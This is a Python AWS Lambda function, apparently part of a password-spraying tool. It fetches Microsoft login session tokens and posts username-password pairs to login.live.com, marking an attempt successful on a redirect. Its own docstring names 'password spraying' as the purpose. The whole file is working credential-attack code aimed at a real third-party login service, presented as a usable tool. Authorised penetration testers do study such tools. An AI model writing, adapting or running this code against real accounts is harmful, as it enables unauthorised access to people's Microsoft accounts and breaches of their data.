import botocore.vendored.requests as requests
import json,datetime

def lambda_handler(event, context):
    return microsoft_authenticate(event['username'], event['password'], event['useragent'])


def microsoft_authenticate(username, password, useragent):
    """
    Attempts to authenticate to the Microsoft login portal
    at login.live.com. If successful, the "success" key is
    set to True. Otherwise the login failed.

    Params:
        (str)username  - Username to authenticate as.
        (str)password  - Password to authenticate with.
        (str)useragent - User agent string to pass during
                         authentication request.

    Returns:
        dict - Dictionary with keys:
            timestamp
            username
            password
            success
            change
            2fa_enabled
            type
            code
            name
            action
            headers
            cookies
    """
    tokens = fetch_session(useragent) 
    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
    data_response = {
            'timestamp': ts,
            'username': username,
            'password': password,
            'success': False,
            'change': False,
            '2fa_enabled': False,
            'type': None,
            'code': None,
            'name': None,
            'action': None,
            'headers': [],
            'cookies': [],
    }
    headers = {}
    headers["Host"] = "login.live.com"
    headers["Connection"] = "close"
    headers["Cache-Control"] = "max-age=0"
    headers["Origin"] = "https://login.live.com"
    headers["Upgrade-Insecure-Requests"] = "1"
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    headers["User-Agent"] = useragent 
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
    headers["Accept-Encoding"] = "gzip, deflate"
    headers["Accept-Language"] = "en-US,en;q=0.9"
    headers["Cookie"] = "MSPOK={};".format(tokens["mspok"])

    payload = {
        "i13":"0",
        "login":username,
        "loginfmt":username,
        "type":"11",
        "LoginOptions":"3",
        "lrt":"",
        "lrtPartition":"",
        "hisRegion":"",
        "hisScaleUnit":"",
        "passwd":password,
        "ps":"2",
        "psRNGCDefaultType":"",
        "psRNGCEntropy":"",
        "psRNGCSLK":"",
        "canary":"",
        "ctx":"",
        "hpgrequestid":"",
        "PPFT":tokens["flow_token"],
        "PPSX":"Passport",
        "NewUser":"1",
        "FoundMSAs":"",
        "fspost":"0",
        "i21":"0",
        "CookieDisclosure":"0",
        "IsFidoSupported":"1",
        "i2":"1",
        "i17":"0",
        "i18":"__ConvergedLoginPaginatedStrings%7C1%2C__ConvergedLogin_PCore%7C1%2C",
        "i19":"26144"
    }
    url = "https://login.live.com/ppsecure/post.srf"
    
    try:
        resp = requests.post(url, data=payload, headers=headers, allow_redirects=False)
        if resp.status_code == 302:
            data_response["success"] = True
        
    except Exception as e:
        data_response["error"] = e
    

    return data_response
    
def fetch_session(useragent):
    """
    Retrieves the Microsoft Login Session data to begin
    password spraying. Specifically, the MSPOK cookie
    and the flow_token required for logins.

    Params:
        (str)useragent - User-Agent string to establish session.

    Returns:
        dict - Dictionary containing flow_token and MSPOK
               values.
    """
    headers = {
        "User-Agent": useragent
    }
    r = requests.get("https://login.live.com/login.srf", headers=headers)
    results = {}
    results["mspok"] = r.cookies["MSPOK"]
    ppft_index = r.content.index(b'name="PPFT"')
    value_index = r.content.index(b'value="', ppft_index)
    end_index = r.content.index(b'"', value_index + 7)
    flow_token = r.content[value_index+7:end_index]
    results["flow_token"] = flow_token
    return results






